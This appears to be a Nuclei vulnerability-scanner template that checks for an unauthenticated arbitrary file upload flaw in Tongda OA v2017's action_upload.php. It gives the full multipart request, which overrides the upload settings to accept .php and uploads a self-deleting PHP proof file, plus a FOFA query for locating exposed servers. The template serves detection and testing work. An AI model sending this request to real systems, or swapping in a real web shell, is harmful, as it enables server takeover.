http:
- matchers:
  - condition: and
    dsl:
    - status_code_1 == 200
    - status_code_2 == 200
    - contains(body_2, '{{result}}')
    type: dsl
  raw:
  - 'POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=---------------------------{{boundary}}

    X-requested-with: XMLHttpRequest

    Accept-Encoding: gzip


    -----------------------------{{boundary}}

    Content-Disposition: form-data; name="CONFIG[fileFieldName]"


    ffff

    -----------------------------{{boundary}}

    Content-Disposition: form-data; name="CONFIG[fileMaxSize]"


    1000000000

    -----------------------------{{boundary}}

    Content-Disposition: form-data; name="CONFIG[filePathFormat]"


    {{filename}}

    -----------------------------{{boundary}}

    Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"


    .php

    -----------------------------{{boundary}}

    Content-Disposition: form-data; name="ffff"; filename="test.php"

    Content-Type: application/octet-stream


    <?php print({{num1}}*{{num2}});unlink(__FILE__);?>

    -----------------------------{{boundary}}

    Content-Disposition: form-data; name="mufile"


    submit

    -----------------------------{{boundary}}--

    '
  - 'GET /{{filename}}.php HTTP/1.1

    Host: {{Hostname}}

    '
id: tongda-oa-action-upload-file-upload
info:
  author: Co5mos
  description: "\u901A\u8FBEOA v2017\u7684 `action_upload.php` \u63A5\u53E3\u5B58\u5728\
    \u6587\u4EF6\u8FC7\u6EE4\u4E0D\u8DB3\u4E14\u65E0\u9700\u540E\u53F0\u6743\u9650\
    \uFF0C\u5BFC\u81F4\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u3002\u653B\
    \u51FB\u8005\u53EF\u4EE5\u901A\u8FC7\u8BE5\u6F0F\u6D1E\u4E0A\u4F20\u4EFB\u610F\
    \u6587\u4EF6\uFF0C\u4ECE\u800C\u83B7\u53D6\u670D\u52A1\u5668\u6743\u9650\u3002\
    \n"
  metadata:
    fofa-query: "app=\"TDXK-\u901A\u8FBEOA\""
  name: Tongda OA v2017 action_upload.php Arbitrary File Upload
  severity: critical
  tags: tongda, file-upload, rce
variables:
  boundary: '{{rand_base(29)}}'
  filename: '{{rand_base(6)}}'
  num1: '{{rand_int(10000, 20000)}}'
  num2: '{{rand_int(10000, 20000)}}'
  result: '{{to_number(num1)*to_number(num2)}}'
